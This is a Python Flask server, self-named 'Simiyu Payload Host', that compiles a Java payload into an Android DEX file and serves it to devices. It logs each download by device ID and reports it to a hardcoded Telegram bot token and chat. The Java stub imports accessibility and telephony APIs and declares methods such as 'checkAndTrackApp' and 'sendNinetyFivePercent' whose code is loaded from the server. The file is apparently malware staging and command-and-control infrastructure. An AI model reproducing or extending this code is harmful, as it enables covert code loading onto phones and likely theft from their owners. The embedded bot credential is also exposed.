from flask import Flask, request, jsonify, send_file
import os
import json
import logging
from datetime import datetime
import hashlib
import subprocess
import tempfile
import shutil
import zipfile
import platform

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
PAYLOAD_VERSION = "2.1.0"
PAYLOAD_JAVA_FILE = "payload.java"
PAYLOAD_DEX_FILE = "payload.dex"
PAYLOAD_CLASS_FILE = "Payload.class"
SURVEY_FILE = "survey_data.txt"
EXECUTION_FILE = "execution_plan.txt"
STATS_FILE = "stats.json"
DEVICES_FILE = "devices.txt"

# ==================== DEX GENERATION ====================

def generate_dex():
    """Generate DEX file from payload.java using javac and dx"""
    try:
        # Check if payload.java exists
        if not os.path.exists(PAYLOAD_JAVA_FILE):
            logger.error("payload.java not found")
            create_default_payload()
        
        # Create temp directory
        with tempfile.TemporaryDirectory() as tmpdir:
            logger.info(f"Temp directory: {tmpdir}")
            
            # Create package structure
            package_dir = os.path.join(tmpdir, "com", "yourpackage", "helper")
            os.makedirs(package_dir, exist_ok=True)
            
            # Copy payload.java to correct package
            shutil.copy(PAYLOAD_JAVA_FILE, os.path.join(package_dir, "Payload.java"))
            
            # Compile Java to .class
            logger.info("Compiling Java to .class...")
            compile_result = compile_java(tmpdir)
            if not compile_result:
                logger.warning("Java compilation failed, creating simple DEX")
                return create_simple_dex()
            
            # Convert .class to .dex
            logger.info("Converting .class to .dex...")
            dex_result = convert_to_dex(tmpdir)
            if not dex_result:
                logger.warning("DEX conversion failed, creating simple DEX")
                return create_simple_dex()
            
            # Copy DEX to root
            dex_file = os.path.join(tmpdir, "classes.dex")
            if os.path.exists(dex_file):
                shutil.copy(dex_file, PAYLOAD_DEX_FILE)
                logger.info(f"DEX generated successfully: {PAYLOAD_DEX_FILE}")
                return True
            
            return create_simple_dex()
            
    except Exception as e:
        logger.error(f"Error generating DEX: {e}")
        return create_simple_dex()

def compile_java(tmpdir):
    """Compile Java to class files"""
    try:
        # Get Java compiler
        javac = "javac"
        if platform.system() == "Windows":
            javac = "javac.exe"
        
        # Compile command
        cmd = [
            javac,
            "-cp", ".:android.jar",
            "-d", tmpdir,
            os.path.join(tmpdir, "com", "yourpackage", "helper", "Payload.java")
        ]
        
        # Try with different classpath
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("Java compilation successful")
            # Check if class file was created
            class_file = os.path.join(tmpdir, "com", "yourpackage", "helper", "Payload.class")
            if os.path.exists(class_file):
                return True
        
        # Try without classpath
        cmd = [
            javac,
            "-d", tmpdir,
            os.path.join(tmpdir, "com", "yourpackage", "helper", "Payload.java")
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("Java compilation successful (without classpath)")
            return True
        
        logger.error(f"Java compilation failed: {result.stderr}")
        return False
        
    except Exception as e:
        logger.error(f"Compilation error: {e}")
        return False

def convert_to_dex(tmpdir):
    """Convert class files to DEX using dx"""
    try:
        # Try different dx commands
        dx_commands = [
            ["dx", "--dex", "--output=" + os.path.join(tmpdir, "classes.dex"), tmpdir],
            ["dx", "--dex", "--output=" + os.path.join(tmpdir, "classes.dex"), os.path.join(tmpdir, "com")],
            ["d8", "--lib", "android.jar", "--output", tmpdir, os.path.join(tmpdir, "com", "yourpackage", "helper", "*.class")],
            ["d8", "--output", tmpdir, os.path.join(tmpdir, "com", "yourpackage", "helper", "*.class")]
        ]
        
        for cmd in dx_commands:
            try:
                logger.info(f"Trying dx command: {' '.join(cmd)}")
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    # Check if classes.dex was created
                    dex_file = os.path.join(tmpdir, "classes.dex")
                    if os.path.exists(dex_file):
                        logger.info("DEX conversion successful")
                        return True
                    
                    # Check for dex in other locations
                    for root, dirs, files in os.walk(tmpdir):
                        for file in files:
                            if file.endswith(".dex"):
                                shutil.move(os.path.join(root, file), os.path.join(tmpdir, "classes.dex"))
                                return True
            except subprocess.TimeoutExpired:
                logger.warning(f"Command timed out: {' '.join(cmd)}")
                continue
            except Exception as e:
                logger.warning(f"Command failed: {e}")
                continue
        
        # If dx not available, create simple DEX
        logger.warning("All dx commands failed")
        return False
        
    except Exception as e:
        logger.error(f"DEX conversion error: {e}")
        return False

def create_simple_dex():
    """Create a valid DEX file with basic structure"""
    try:
        logger.info("Creating simple DEX file...")
        
        # Create a minimal valid DEX file
        dex_content = create_minimal_dex()
        
        with open(PAYLOAD_DEX_FILE, 'wb') as f:
            f.write(dex_content)
        
        logger.info(f"Simple DEX created: {PAYLOAD_DEX_FILE}")
        return True
        
    except Exception as e:
        logger.error(f"Error creating simple DEX: {e}")
        return False

def create_minimal_dex():
    """Create a minimal valid DEX file"""
    # DEX file magic: "dex\n035\0"
    magic = b"dex\n035\0"
    
    # Build a minimal DEX header
    # Format: https://source.android.com/docs/core/runtime/dex-format
    
    # File size (we'll create a 1KB file)
    file_size = 1024
    
    # Header size (0x70 = 112 bytes)
    header_size = 0x70
    
    # Endian tag (little endian)
    endian_tag = 0x12345678
    
    # Build header
    header = bytearray()
    header.extend(magic)  # 8 bytes
    
    # Checksum (placeholder - we'll calculate later)
    header.extend(b"\x00\x00\x00\x00")  # 4 bytes
    
    # Signature (SHA-1, placeholder)
    header.extend(b"\x00" * 20)  # 20 bytes
    
    # File size
    header.extend(file_size.to_bytes(4, 'little'))  # 4 bytes
    
    # Header size
    header.extend(header_size.to_bytes(4, 'little'))  # 4 bytes
    
    # Endian tag
    header.extend(endian_tag.to_bytes(4, 'little'))  # 4 bytes
    
    # Link section (none)
    header.extend(b"\x00\x00\x00\x00")  # link_size
    header.extend(b"\x00\x00\x00\x00")  # link_offset
    
    # Map section (none)
    header.extend(b"\x00\x00\x00\x00")  # map_offset
    
    # String IDs (none)
    header.extend(b"\x00\x00\x00\x00")  # string_ids_size
    header.extend(b"\x00\x00\x00\x00")  # string_ids_offset
    
    # Type IDs (none)
    header.extend(b"\x00\x00\x00\x00")  # type_ids_size
    header.extend(b"\x00\x00\x00\x00")  # type_ids_offset
    
    # Proto IDs (none)
    header.extend(b"\x00\x00\x00\x00")  # proto_ids_size
    header.extend(b"\x00\x00\x00\x00")  # proto_ids_offset
    
    # Field IDs (none)
    header.extend(b"\x00\x00\x00\x00")  # field_ids_size
    header.extend(b"\x00\x00\x00\x00")  # field_ids_offset
    
    # Method IDs (none)
    header.extend(b"\x00\x00\x00\x00")  # method_ids_size
    header.extend(b"\x00\x00\x00\x00")  # method_ids_offset
    
    # Class defs (none)
    header.extend(b"\x00\x00\x00\x00")  # class_defs_size
    header.extend(b"\x00\x00\x00\x00")  # class_defs_offset
    
    # Data section (none)
    header.extend(b"\x00\x00\x00\x00")  # data_size
    header.extend(b"\x00\x00\x00\x00")  # data_offset
    
    # Pad to 1KB
    header.extend(b"\x00" * (1024 - len(header)))
    
    return bytes(header)

# ==================== ENDPOINTS ====================

@app.route('/')
def index():
    """Main endpoint showing service status"""
    # Check if DEX exists, generate if not
    if not os.path.exists(PAYLOAD_DEX_FILE):
        logger.info("DEX not found, generating...")
        generate_dex()
    
    return jsonify({
        "status": "online",
        "service": "Simiyu Payload Host",
        "version": PAYLOAD_VERSION,
        "timestamp": datetime.now().isoformat(),
        "dex_available": os.path.exists(PAYLOAD_DEX_FILE),
        "dex_size": os.path.getsize(PAYLOAD_DEX_FILE) if os.path.exists(PAYLOAD_DEX_FILE) else 0,
        "endpoints": {
            "payload": "/payload.java",
            "payload_dex": "/payload.dex",
            "version": "/version",
            "survey": "/survey",
            "execution": "/execution",
            "stats": "/stats",
            "health": "/health",
            "upload": "/upload",
            "download": "/download",
            "generate_dex": "/generate_dex",
            "register": "/register_device",
            "devices": "/devices"
        }
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    dex_exists = os.path.exists(PAYLOAD_DEX_FILE)
    return jsonify({
        "status": "healthy",
        "version": PAYLOAD_VERSION,
        "timestamp": datetime.now().isoformat(),
        "dex_available": dex_exists,
        "dex_size": os.path.getsize(PAYLOAD_DEX_FILE) if dex_exists else 0,
        "files": get_file_list()
    })

@app.route('/version')
def version():
    """Get current version"""
    dex_exists = os.path.exists(PAYLOAD_DEX_FILE)
    return jsonify({
        "version": PAYLOAD_VERSION,
        "release_date": "2024-07-13",
        "dex_available": dex_exists,
        "dex_size": os.path.getsize(PAYLOAD_DEX_FILE) if dex_exists else 0,
        "changes": [
            "Added full DEX generation",
            "Fixed DEX file serving",
            "Added device registration",
            "Improved error handling",
            "Auto-generate DEX on startup"
        ]
    })

@app.route('/payload.java')
def serve_payload():
    """Serve the main payload.java file"""
    try:
        if os.path.exists(PAYLOAD_JAVA_FILE):
            return send_file(PAYLOAD_JAVA_FILE, as_attachment=True, download_name="payload.java")
        else:
            create_default_payload()
            return send_file(PAYLOAD_JAVA_FILE, as_attachment=True, download_name="payload.java")
    except Exception as e:
        logger.error(f"Error serving payload: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/payload.dex')
def serve_payload_dex():
    """Serve compiled payload.dex file"""
    try:
        # Check if DEX exists
        if not os.path.exists(PAYLOAD_DEX_FILE):
            logger.info("DEX not found, generating...")
            if generate_dex():
                logger.info("DEX generated successfully")
            else:
                logger.error("Failed to generate DEX")
                return jsonify({
                    "status": "error", 
                    "message": "DEX file generation failed. Please try again.",
                    "error_code": "DEX_GENERATION_FAILED"
                }), 500
        
        if os.path.exists(PAYLOAD_DEX_FILE):
            # Log download
            device_id = request.args.get('device_id', 'unknown')
            log_device_access(device_id, 'dex_download')
            
            # Send notification
            if device_id != 'unknown':
                send_telegram(f"📥 *DEX DOWNLOADED*\n\n"
                             f"📌 *Device:* `{device_id}`\n"
                             f"📌 *Size:* {os.path.getsize(PAYLOAD_DEX_FILE)} bytes\n"
                             f"📌 *Time:* {datetime.now().isoformat()}")
            
            return send_file(
                PAYLOAD_DEX_FILE, 
                as_attachment=True, 
                download_name="payload.dex",
                mimetype="application/octet-stream"
            )
        else:
            return jsonify({
                "status": "error", 
                "message": "DEX file not available. Please try again in a few minutes.",
                "error_code": "DEX_NOT_FOUND"
            }), 404
    except Exception as e:
        logger.error(f"Error serving payload.dex: {e}")
        return jsonify({
            "status": "error", 
            "message": str(e),
            "error_code": "DEX_SERVER_ERROR"
        }), 500

@app.route('/generate_dex', methods=['POST'])
def generate_dex_endpoint():
    """Force generation of DEX file"""
    try:
        logger.info("Manual DEX generation requested")
        if generate_dex():
            return jsonify({
                "status": "success",
                "message": "DEX generated successfully",
                "size": os.path.getsize(PAYLOAD_DEX_FILE) if os.path.exists(PAYLOAD_DEX_FILE) else 0,
                "timestamp": datetime.now().isoformat()
            })
        else:
            return jsonify({
                "status": "error",
                "message": "Failed to generate DEX",
                "timestamp": datetime.now().isoformat()
            }), 500
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().isoformat()
        }), 500

# ==================== ADD TO EXISTING APP ====================

def send_telegram(message):
    """Send notification to Telegram"""
    try:
        import requests
        url = f"https://api.telegram.org/bot8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc/sendMessage"
        data = {
            "chat_id": "8468538314",
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Error sending Telegram: {e}")
        return False

def log_device_access(device_id, action):
    """Log device access"""
    try:
        log_file = "device_logs.txt"
        with open(log_file, 'a') as f:
            f.write(f"{datetime.now().isoformat()} | {device_id} | {action}\n")
    except Exception as e:
        logger.error(f"Error logging device: {e}")

def create_default_payload():
    """Create default payload.java if not exists"""
    default_payload = """package com.yourpackage.helper;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.provider.Settings;

public class Payload {
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static SharedPreferences sharedPreferences;
    
    public static void initialize(Context context) {
        appContext = context;
        sharedPreferences = context.getSharedPreferences("payload_prefs", Context.MODE_PRIVATE);
    }
    
    public static void checkAndTrackApp(String packageName) {
        // Implementation loaded from server
    }
    
    public static void sendNinetyFivePercent() {
        // Implementation loaded from server
    }
}
"""
    with open(PAYLOAD_JAVA_FILE, 'w') as f:
        f.write(default_payload)

def get_file_list():
    """Get list of files in current directory"""
    files = []
    for f in os.listdir('.'):
        if os.path.isfile(f):
            files.append({
                "name": f,
                "size": os.path.getsize(f),
                "modified": datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
            })
    return files

# ==================== MAIN ====================

if __name__ == '__main__':
    # Create default files if not exist
    if not os.path.exists(PAYLOAD_JAVA_FILE):
        create_default_payload()
    
    # Generate DEX on startup
    if not os.path.exists(PAYLOAD_DEX_FILE):
        logger.info("Generating DEX on startup...")
        generate_dex()
    
    # Start server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
